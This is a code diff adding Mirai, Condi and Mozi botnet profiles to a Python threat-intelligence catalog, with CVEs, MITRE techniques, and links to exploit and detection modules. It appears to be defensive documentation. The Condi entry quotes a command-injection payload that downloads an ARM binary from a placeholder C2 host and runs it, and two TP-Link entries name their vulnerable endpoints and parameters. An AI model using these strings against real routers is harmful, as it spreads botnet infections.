@@ -1063,6 +1063,217 @@ def _build_catalog() -> None:
         ],
     )
 
+    # -----------------------------------------------------------------------
+    # Botnet threat actors — Mirai, Condi, Mozi
+    # -----------------------------------------------------------------------
+
+    APT_CATALOG["mirai_botnet"] = APTGroup(
+        id="mirai_botnet",
+        name="Mirai Botnet",
+        aliases=["Mirai", "Okiru", "Satori", "Masuta", "PureMasuta", "Wicked", "Sylveon",
+                 "OMG", "Fbot", "Mozi (Mirai lineage)", "IZ1H9"],
+        country="Unknown (multiple operators)",
+        description=(
+            "Mirai is an IoT botnet first identified in 2016, whose source code was "
+            "publicly released enabling dozens of variants. It scans for devices with "
+            "default/weak Telnet credentials (port 23/2323) and deploys ELF binaries "
+            "to recruit them into a DDoS mesh. Responsible for record-breaking "
+            "DDoS attacks (Dyn DNS, OVH, KrebsOnSecurity). Still actively exploited "
+            "in 2025 via CVE-2023-33538 (TP-Link), CVE-2023-1389 (AX21), and dozens "
+            "of additional SOHO router vulnerabilities. CISA KEV references multiple "
+            "Mirai-exploited CVEs."
+        ),
+        campaigns=[
+            "Dyn DNS DDoS (Oct 2016, ~1.2 Tbps)",
+            "OVH DDoS (Sep 2016, ~1 Tbps)",
+            "Satori/Okiru (2017-2018, Huawei CVE-2017-17215)",
+            "Condi/IZ1H9 TP-Link campaigns (2023-2025)",
+        ],
+        references=[
+            "https://unit42.paloaltonetworks.com/mirai-botnet/",
+            "https://krebsonsecurity.com/2016/10/source-code-for-iot-attack-tool-mirai-released/",
+            "https://www.usenix.org/system/files/conference/usenixsecurity17/sec17-antonakakis.pdf",
+            "https://github.com/jgamblin/Mirai-Source-Code",
+        ],
+        mitre_id="G0000",
+        attacks=[
+            APTAttack(
+                name="Mirai Default Credential Telnet Sweep",
+                description=(
+                    "Scans the IPv4 space for Telnet (23/2323) and tests 62 hardcoded "
+                    "factory-default credential pairs.  Successful login results in "
+                    "device recruitment into the botnet mesh.  Credential table extracted "
+                    "from mirai/bot/scanner.c in the original source release."
+                ),
+                cves=[],
+                modules=[
+                    "scanners/threat_detection/mirai_default_creds_sweep",
+                    "scanners/threat_detection/mirai_infection_scan",
+                ],
+                mitre_techniques=["T1078.001", "T1110.001", "T1133"],
+                target_devices=[
+                    "Generic IoT / SOHO Routers",
+                    "IP Cameras / DVR / NVR",
+                    "Network Switches",
+                ],
+                phase="Initial Access -- Credential Abuse",
+                requires_auth=False,
+            ),
+            APTAttack(
+                name="TP-Link WR940N/WR740N/WR841N SSID Command Injection (CVE-2023-33538)",
+                description=(
+                    "Authenticated command injection in TP-Link SOHO routers via the "
+                    "/userRpm/WlanNetworkRpm ssid1 parameter.  Firmware does not sanitise "
+                    "user-supplied SSID values, allowing shell metacharacter injection "
+                    "executed as root.  Actively exploited by Mirai/Condi (2025, CISA KEV)."
+                ),
+                cves=["CVE-2023-33538"],
+                modules=["exploits/routers/tplink/wr940n_740n_841n_ssid_cmd_injection_cve_2023_33538"],
+                mitre_techniques=["T1190", "T1059.004"],
+                target_devices=["TP-Link TL-WR940N", "TP-Link TL-WR740N", "TP-Link TL-WR841N"],
+                phase="Initial Access -- Exploitation",
+                requires_auth=True,
+            ),
+            APTAttack(
+                name="TP-Link Archer AX21 Unauthenticated Command Injection (CVE-2023-1389)",
+                description=(
+                    "Unauthenticated command injection via the country parameter in the "
+                    "TP-Link AX21 locale API (/cgi-bin/luci/;stok=/locale).  No auth "
+                    "required; widely exploited by Mirai variants for mass router "
+                    "recruitment (2023-2025)."
+                ),
+                cves=["CVE-2023-1389"],
+                modules=["exploits/routers/tplink/archer_ax21_unauthenticated_command_injection_cve_2023_1389"],
+                mitre_techniques=["T1190", "T1059.004"],
+                target_devices=["TP-Link Archer AX21"],
+                phase="Initial Access -- Exploitation",
+                requires_auth=False,
+            ),
+            APTAttack(
+                name="Botnet C2 Port Scan and Banner Fingerprinting",
+                description=(
+                    "Scans for TCP ports associated with Mirai/Condi/Gafgyt C2 channels "
+                    "(23, 2323, 7547, 37215, 52869, 8080, 9001, 6667, 8443, 48101, 46266). "
+                    "Fetches banners and correlates against known botnet binary strings."
+                ),
+                cves=[],
+                modules=["scanners/threat_detection/botnet_c2_port_scan"],
+                mitre_techniques=["T1571", "T1095", "T1219"],
+                target_devices=["Any networked device"],
+                phase="Discovery -- C2 Reconnaissance",
+                requires_auth=False,
+            ),
+        ],
+    )
+
+    APT_CATALOG["condi_botnet"] = APTGroup(
+        id="condi_botnet",
+        name="Condi Botnet",
+        aliases=["Condi", "Condi-v2", "IZ1H9", "Condi DDoS-as-a-Service"],
+        country="Unknown",
+        description=(
+            "Condi is a Mirai-based DDoS-for-hire botnet first observed in mid-2023, "
+            "targeting TP-Link AX21 routers (CVE-2023-1389) and later expanding to "
+            "TP-Link WR940N/WR740N/WR841N via CVE-2023-33538.  Condi operators sell "
+            "DDoS capacity as a service via Telegram channels.  The malware kills "
+            "competing bots and persists across reboots via /etc/rc.d/ or init.d. "
+            "CISA KEV listed CVE-2023-33538 in June 2025 due to active Condi exploitation."
+        ),
+        campaigns=[
+            "Condi DDoS-as-a-Service Telegram (2023)",
+            "CVE-2023-1389 AX21 mass exploitation (2023)",
+            "CVE-2023-33538 WR940N/WR841N campaign (2024-2025)",
+        ],
+        references=[
+            "https://unit42.paloaltonetworks.com/exploitation-of-cve-2023-33538/",
+            "https://cybersecuritynews.com/hackers-target-tp-link-routers/",
+            "https://www.fortinet.com/blog/threat-research/condi-ddos-botnet",
+        ],
+        mitre_id="G0000",
+        attacks=[
+            APTAttack(
+                name="TP-Link WR940N/WR741N/WR841N SSID Injection -- Condi Recruitment (CVE-2023-33538)",
+                description=(
+                    "Condi operators authenticate with default admin:admin credentials and "
+                    "inject the Condi ELF arm7 binary URL into ssid1 parameter: "
+                    "$(wget http://C2/arm7 -O /tmp/arm7; chmod 777 /tmp/arm7; /tmp/arm7). "
+                    "Device is recruited into Condi botnet mesh for DDoS campaigns."
+                ),
+                cves=["CVE-2023-33538"],
+                modules=["exploits/routers/tplink/wr940n_740n_841n_ssid_cmd_injection_cve_2023_33538"],
+                mitre_techniques=["T1190", "T1059.004", "T1078.001"],
+                target_devices=["TP-Link TL-WR940N v2/v4", "TP-Link TL-WR740N v1/v2", "TP-Link TL-WR841N v8/v10"],
+                phase="Initial Access + Execution",
+                requires_auth=True,
+            ),
+            APTAttack(
+                name="Condi Infection Indicator Detection",
+                description=(
+                    "Multi-signal detection of Condi-infected devices: open Telnet ports, "
+                    "default credentials, BusyBox banner, and C2 port exposure. "
+                    "Correlates with known Condi C2 infrastructure signatures."
+                ),
+                cves=[],
+                modules=[
+                    "scanners/threat_detection/mirai_infection_scan",
+                    "scanners/threat_detection/botnet_c2_port_scan",
+                    "scanners/threat_detection/mirai_default_creds_sweep",
+                ],
+                mitre_techniques=["T1078.001", "T1571", "T1095"],
+                target_devices=["TP-Link SOHO Routers"],
+                phase="Detection -- Compromise Assessment",
+                requires_auth=False,
+            ),
+        ],
+    )
+
+    APT_CATALOG["mozi_botnet"] = APTGroup(
+        id="mozi_botnet",
+        name="Mozi Botnet",
+        aliases=["Mozi", "Mozi P2P"],
+        country="China (suspected)",
+        description=(
+            "Mozi is a P2P IoT botnet based on a modified BitTorrent DHT (Kademlia) "
+            "protocol, first observed in 2019.  Unlike Mirai-family botnets that rely "
+            "on centralized C2, Mozi nodes communicate peer-to-peer over UDP port 14836 "
+            "and 48101, making it resilient to C2 takedowns.  Primarily targets GPON "
+            "routers, Netgear, Huawei, and generic SOHO devices via default credentials "
+            "and known CVEs.  In August 2023, a kill-switch was activated (possibly by "
+            "Chinese law enforcement), but variants and successors remain active."
+        ),
+        campaigns=[
+            "Mozi DHT botnet (2019-2023)",
+            "Mozi successor variants (2023-2025)",
+        ],
+        references=[
+            "https://blog.netlab.360.com/mozi-another-botnet-using-dht/",
+            "https://www.trendmicro.com/en_us/research/21/l/mozi-botnet-successor.html",
+            "https://securelist.com/mozi-botnet/",
+        ],
+        mitre_id="G0000",
+        attacks=[
+            APTAttack(
+                name="Mozi DHT Peer Discovery (UDP 14836 / 48101)",
+                description=(
+                    "Sends a crafted DHT find_node query (BEP-5 bencode format) to the "
+                    "target on UDP port 14836 and 48101.  A valid DHT response containing "
+                    "'2:id' and '1:y1:r' indicates an active Mozi DHT node.  Mozi nodes "
+                    "additionally embed a config block in the 'g' key of the response."
+                ),
+                cves=[],
+                modules=["scanners/threat_detection/mozi_dht_presence_scan"],
+                mitre_techniques=["T1095", "T1571", "T1590.001"],
+                target_devices=[
+                    "Generic IoT / SOHO Routers",
+                    "IP Cameras / NAS",
+                    "Huawei HG532 / GPON Routers",
+                ],
+                phase="Discovery -- Botnet Node Detection",
+                requires_auth=False,
+            ),
+        ],
+    )
+
 
 def get_catalog() -> Dict[str, APTGroup]:
     """Return the full APT catalog, building it on first access."""
